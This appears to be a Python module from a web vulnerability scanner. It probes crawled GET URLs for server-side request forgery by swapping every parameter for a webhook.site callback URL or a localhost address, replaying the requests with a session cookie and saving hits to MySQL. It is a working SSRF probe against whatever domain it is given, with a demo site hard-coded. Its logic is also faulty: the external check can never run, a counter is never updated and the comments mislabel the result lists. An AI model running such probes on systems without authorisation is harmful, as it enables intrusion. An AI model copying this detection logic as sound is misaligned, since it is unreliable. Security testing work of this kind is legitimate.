# the following is the

# the URL for the webhook: https://webhook.site/6097d5e4-08b9-4ffc-8cd1-3327038782e3
# the URL for the email address: 6097d5e4-08b9-4ffc-8cd1-3327038782e3@email.webhook.site

# 1. Using the webhook to check if the web server is able to make requests to other URLs that are not permitted.
# See even if it can access things on the network.

import requests
import mysql.connector
import sys
import configparser
from os.path import dirname

sys.path.append(dirname(dirname(f"{__file__}")))
from v2.yaml_vuln import vuln_extract
from bs4 import BeautifulSoup
import json
import time
import hashlib
from urllib.parse import urlparse
from seleniumBot import login_get_cookie_jar

if __name__ == "__main__":
    user_input = sys.argv[1]  # this is the domain
    scan_id = int(sys.argv[2])

parsed_url = urlparse(user_input)
scheme = parsed_url.scheme
netloc = parsed_url.netloc
url = scheme + "://" + netloc

# retrieve info from config.ini
config = configparser.ConfigParser()
config.read("config.ini")
username = config.get("Advanced Scan Settings", "scraping_username")
password = config.get("Advanced Scan Settings", "scraping_password")
ssrf = config.get("Advanced Scan Settings", "scan_for_ssrf")


# def login(username, password):
#     login_info = {"loginId": username, "password": password}
#     response = requests.post(
#         "https://chmsdemo.greenfossil.com/authenticate", data=login_info
#     )
#     session_cookie = response.cookies
#     return session_cookie


def tryssrf(listofgeturlrequests, token1, session_cookie):
    trylist_ext = set()
    trylist_int = set()
    for url in listofgeturlrequests:
        # first, attempt to add in the URL of a webhook.
        querysplit = url.split("?")
        anpersplit = querysplit[1].split("&")
        newlist_ext = []
        newlist_int = []
        for i in anpersplit:
            valusplit = i.split("=")
            # Change the value of the parameter to the webhook website
            querystring = f"{valusplit[0]}={f'https://webhook.site/{token1}'}"
            newlist_ext.append(querystring)
            # Change the value of the parameter to the internal testing website
            querystring = f"{valusplit[0]}={f'https://127.0.0.1/login'}"
            newlist_int.append(querystring)
        addanper_ext = "&".join(newlist_ext)
        addanper_int = "&".join(newlist_int)
        addquery_ext = f"{querysplit[0]}?{addanper_ext}"
        addquery_int = f"{querysplit[0]}?{addanper_int}"
        trylist_ext.add(addquery_ext)  # 1 for testing if it will access internal
        trylist_int.add(
            (url, addquery_int)
        )  # another for testing if it will access external

    # begin testing already
    vulnlist = {"internal": [], "external": []}
    # finding the hash of the login page.
    resp = requests.get(
        "https://chmsdemo.greenfossil.com/login"
    )  # create a request using normal access
    loginhash = hashlib.sha1(resp.text.encode()).hexdigest()

    for i in trylist_int:
        print("Testing if ssrf works to the internal network:", i)
        resp = requests.get(
            i[1], cookies=session_cookie
        )  # create a request using the payload
        hash2 = hashlib.sha1(resp.text.encode()).hexdigest()
        time.sleep(0.5)
        if loginhash == hash2:
            vulnlist["internal"].append(i[0])
    # accessing internal
    if len(vulnlist) == 0:
        count = 0
        for i in trylist_ext:
            print("Testing if ssrf works to the external network:", i)
            requests.get(i, cookies=session_cookie)
            time.sleep(1)
            resp = requests.get(f"https://webhook.site/token/{token1}/requests")
            new_count = json.loads(resp.text)["total"]
            if new_count > count:  # New request detected
                vulnlist["external"].append(i)
    return vulnlist


# login first
if ssrf == "1":
    session_cookie = login_get_cookie_jar(url, username, password)
    if session_cookie == -1 :
        print("Incorrect Credentials")
        sys.exit()
    # session_cookie = login(username, password)
    url_testlist = []
    # get the URLs that are GET requests as well as the URLs and have a parameter to inject
    with open("crawl.txt", "r") as crawl_file:
        for i in crawl_file.readlines():
            data_dict = json.loads(i)
            if data_dict["Method"] == "GET":
                if "?" in data_dict["URL"]:
                    url_testlist.append(data_dict["URL"])
    ### generating the token for the webhook
    resp = requests.post("https://webhook.site/token")
    token1 = json.loads(resp.text)["uuid"]

    vulnerabilitylist = tryssrf(url_testlist, token1, session_cookie)
    # vulnerabilitylist = ["1","2","3"]
    ### check if the webhook has detected a request made to it
    # resp = requests.get(f"https://webhook.site/token/{token1}/requests")
    # print(json.loads(resp.text)["data"])
    # ###
    # if len(json.loads(resp.text)["data"]) >= 1:
    #     additional_information = "Managed to manipulate application to access site outside the network"
    #     ssrfWeak = True
    # elif len(vulnerabilitylist) >= 1:
    #     ssrfWeak = True
    #     vulnstring = ",".join(vulnerabilitylist)
    #     additional_information = f"Managed to manipulate application to manipulate resources inside the network urls."
    # else:
    #     ssrfWeak = False
    #     print("Not vulnerable")
    ssrfWeak = False
    if len(vulnerabilitylist["internal"]) > 0 or len(vulnerabilitylist["external"]) > 0:
        ssrfWeak = True

    # 4th is involving in sending the SQL to the database
    if ssrfWeak:
        db_host = config.get("SQL Database", "db_host")
        db_user = config.get("SQL Database", "db_user")
        db_password = config.get("SQL Database", "db_password")
        db_connection = mysql.connector.connect(
            host=db_host, user=db_user, password=db_password, database="vulnerabilities"
        )

        db_cursor = db_connection.cursor()
        cwe_id = "CWE-918"
        # Insert a row into the MySQL table
        vuln_yml = vuln_extract(cwe_id)
        name = vuln_yml["name"]
        vulnerabilitylist_json = json.dumps(vulnerabilitylist)
        insert_query = "INSERT INTO vulnerabilities (scan_id, vulnerability_name, vulnerability_id, url, additional_information) VALUES (%s, %s, %s, %s, %s)"
        values = []
        values.append([scan_id, name, cwe_id, user_input, vulnerabilitylist_json])
        print(values)
        db_cursor.executemany(insert_query, values)  # Insert multiple rows together
        db_connection.commit()
        db_cursor.close()
        db_connection.close()
